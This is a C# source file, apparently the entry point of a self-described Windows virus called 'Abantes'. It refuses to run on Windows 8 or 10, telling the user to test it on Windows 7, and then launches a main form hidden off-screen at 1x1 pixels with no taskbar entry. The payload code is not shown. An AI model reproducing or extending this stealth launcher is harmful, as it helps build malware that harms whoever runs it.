using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace Abantes
{
    class Start
    {
        [DllImport("user32.dll", SetLastError = true)]
        static extern bool SetProcessDPIAware();
        [STAThread]
        static void Main(string[] args)
        {
            SetProcessDPIAware();

            OperatingSystem os = Environment.OSVersion;
            Version vs = os.Version;
            string operatingSystem = "";
            if (os.Platform == PlatformID.Win32NT)
            {
                switch (vs.Major)
                {
                    case 6:
                        if (vs.Minor == 2)
                            operatingSystem = "8";
                        else if (vs.Minor == 3)
                            operatingSystem = "8.1";
                        break;
                    case 10:
                        operatingSystem = "10";
                        break;
                    default:
                        break;
                }
            }
            if (operatingSystem == "10")
            {
                MessageBox.Show("This Virus Dosen't Work On Windows 10" + "\n" + "Please Use Windows 7 To Test This Virus", "Error", 0, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
            else if (operatingSystem == "8")
            {
                MessageBox.Show("This Virus Dosen't Work On Windows 8 or 8.x" + "\n" + "Please Use Windows 7 To Test This Virus", "Error", 0, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
            else if (operatingSystem == "8.1")
            {
                MessageBox.Show("This Virus Dosen't Work On Windows 8 or 8.x" + "\n" + "Please Use Windows 7 To Test This Virus", "Error", 0, MessageBoxIcon.Error);
                Environment.Exit(0);
            }

            Form f = new MainThread();
            f.FormBorderStyle = FormBorderStyle.FixedToolWindow;
            f.ShowInTaskbar = false;
            f.StartPosition = FormStartPosition.Manual;
            f.Location = new System.Drawing.Point(-2000, -2000);
            f.Size = new System.Drawing.Size(1, 1);

            Application.EnableVisualStyles();
            Application.Run(f);
        }
    }
}
